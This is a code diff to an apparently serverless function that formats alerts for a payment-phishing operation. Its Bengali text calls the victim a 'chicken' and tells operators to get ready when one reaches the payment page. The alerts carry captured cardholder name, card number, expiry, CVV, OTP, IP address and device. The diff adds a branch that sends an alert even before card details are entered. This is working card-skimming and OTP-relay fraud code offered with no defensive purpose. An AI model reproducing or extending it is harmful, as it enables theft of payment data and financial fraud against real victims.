@@ -42,18 +42,29 @@ serve(async (req) => {
 
     if (type === 'payment_activity') {
       if (paymentType === 'card') {
-        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
-          `-------------------\n\n` +
-          `Payment Method : ${method || ''}\n` +
-          `Cardholder Name : ${cardName || ''}\n` +
-          `Card Number : ${cardNumber || ''}\n` +
-          `Expiry Date : ${expiry || ''}\n` +
-          `CVV : ${cvv || ''}\n\n` +
-          `OTP : ${otp || ''}\n\n` +
-          `-------------------\n\n` +
-          `🐔মুরগির Device : ${device}\n` +
-          `🐔মুরগির IP : ${clientIp}\n` +
-          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+        const hasCardDetails = cardName || cardNumber || expiry || cvv;
+        if (hasCardDetails) {
+          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
+            `-------------------\n\n` +
+            `Payment Method : ${method || ''}\n` +
+            `Cardholder Name : ${cardName || ''}\n` +
+            `Card Number : ${cardNumber || ''}\n` +
+            `Expiry Date : ${expiry || ''}\n` +
+            `CVV : ${cvv || ''}\n\n` +
+            `OTP : ${otp || ''}\n\n` +
+            `-------------------\n\n` +
+            `🐔মুরগির Device : ${device}\n` +
+            `🐔মুরগির IP : ${clientIp}\n` +
+            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+        } else {
+          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
+            `-------------------\n\n` +
+            `Payment Method : Card Payment\n\n` +
+            `-------------------\n\n` +
+            `🐔মুরগির Device : ${device}\n` +
+            `🐔মুরগির IP : ${clientIp}\n` +
+            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+        }
       } else {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
           `-------------------\n\n` +
